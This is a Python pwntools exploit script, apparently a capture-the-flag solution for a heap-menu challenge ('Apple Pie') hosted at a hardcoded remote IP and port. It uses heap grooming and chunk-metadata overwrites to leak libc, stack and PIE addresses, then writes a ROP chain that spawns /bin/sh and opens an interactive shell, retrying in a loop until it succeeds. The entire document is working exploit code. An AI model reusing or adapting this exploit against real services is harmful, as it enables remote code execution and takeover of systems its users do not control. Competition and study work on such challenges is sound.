from pwn import *
LONG_MAX = 0xffffffffffffffff
#context.log_level ='debug'
HOST = "111.186.63.147"
PORT = 6666
REMOTE = 1

while True:
  if(REMOTE):
    s = remote(HOST,PORT)
  else:
    s = remote('127.0.0.1',PORT)

  def add(style, shape, size, name):
    s.recvuntil("Choice:")
    s.sendline("1")
    s.recvuntil("Choice:")
    s.sendline(str(style))
    s.recvuntil("Choice:")
    s.sendline(str(shape))
    s.recvuntil("Size:")
    s.sendline(str(size))
    s.recvuntil("Name:")
    s.send(name)
  def update(idx, style, shape, size, name):
    s.recvuntil("Choice:")
    s.sendline("3")
    s.recvuntil("Index:")
    s.sendline(str(idx))
    s.recvuntil("Choice:")
    s.sendline(str(style))
    s.recvuntil("Choice:")
    s.sendline(str(shape))
    s.recvuntil("Size:")
    s.sendline(str(size))
    s.recvuntil("Name:")
    s.send(name)
  def show(idx):
    s.recvuntil("Choice:")
    s.sendline("2")
    s.recvuntil("Index:")
    s.sendline(str(idx))
  def delete(idx):
    s.recvuntil("Choice:")
    s.sendline("4")
    s.recvuntil("Index:")
    s.sendline(str(idx))
  # clear freelist
  try:
    add(1,1,0x28,"BBBB\n")
    add(1,1,0x28,"BBBB\n")

    # setup heap layout
    add(1,1,0x28,"A"*0x28)
    delete(2)
    add(1,1,0x50,"A"*0x50)
    add(1,1,0x70,"B"*0x70)
    add(1,1,0x28,"C"*0x28)
    delete(4)
    add(1,1,0x50,"C"*0x50)
    add(1,1,0x28,"K"*0x50)
    delete(3)
    delete(5)
    update(2, 1, 1, 0x50+24, "A"*(0x50)+p64(0x0000000000000000)*2 + p64(6+3+3))
    delete(2)
    add(1,1,0x28,p64(0xdeadbeef)*2+p64(-0x11&LONG_MAX)*2+p64(0xdeadbeef))
    add(1,1,0x28,p64(0xdeadbeef)*2+p64(-0x11&LONG_MAX)*2+p64(0xdeadbeef))
    add(1,1,0x28,p64(0x41424344)*2+p64(-0x11&LONG_MAX)*2+p64(0x13371337))
    update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*1+'\n')
    show(4)
    libc = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x4110 - 0x32d8b000
    print "LIBC @ "+hex(libc)
    env = libc+0x32d8e050
    update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*2+p64(env)+'\n')
    show(4)
    s.recvuntil("Name: ")
    stack_ptr = u64(s.recv(6)+"\x00\x00")

    update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*2+p64(stack_ptr)+'\n')
    show(4)
    s.recvuntil("Name: ")
    stack = u64(s.recv(6)+"\x00\x00")
    print "STACK @ "+hex(stack)

    ret = stack - 0xd8
    update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*2+p64(ret)+'\n')
    show(4)
    s.recvuntil("Name: ")
    pie = u64(s.recvuntil("\x01")[-5:]+"\x00\x00\x00") - 0x152c
    print "PIE @ " + hex(pie)
    ret = pie+0x01Bcb
    t = stack - 0x68
    while( 1 ):
      update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*2+p64(t)+'\n')
      show(4)
      f = u64(s.recvuntil("======Apple Pie======")[-5-21-1:-21-1]+"\x00\x00\x00")
      print hex(f)
      if f == ret:
        break;
      t += 8
    print "Find! @  "+ hex(t)
    #s.interactive()
    
    #atoi_ptr = pie+0x002050
    pivot = t#stack - 0x68
    update(5, 1, 1, 0x28+24, "A"*0x10+ p64(-0x11&LONG_MAX)*2 + p64(0x13371337)*2+p64(pivot)+'\n')
    gadget1 = 0x00000000000591d2 # pop rsi ; ret
    gadget2 = 0x0000000000031c4e # pop rdx ; mov eax, 1 ; rett
    gadget3 = 0x00001104 # pop rdi ; pop rbp ; ret
    rop = p64(libc + gadget1)
    rop += p64(0)
    
    rop += p64(libc + gadget3)
    rop += p64(pivot + 0x8*18)
    rop += p64(pivot + 0x8*18)
    rop = p64(libc+gadget3)
    rop += p64(pivot+0x8*4)
    rop += p64(0x0)
    #rop += p64(pie+0x01C5A)
    rop += p64(libc+0x00638ED)
    rop += "/bin/sh\x00"
    update(4,1,1,0x1337,rop+'\n')

    #add(1,1,0x10,"/bin/sh\x00\n")
    #raw_input()
    #delete(6)
    s.interactive()
  except:
    s.close()
    continue
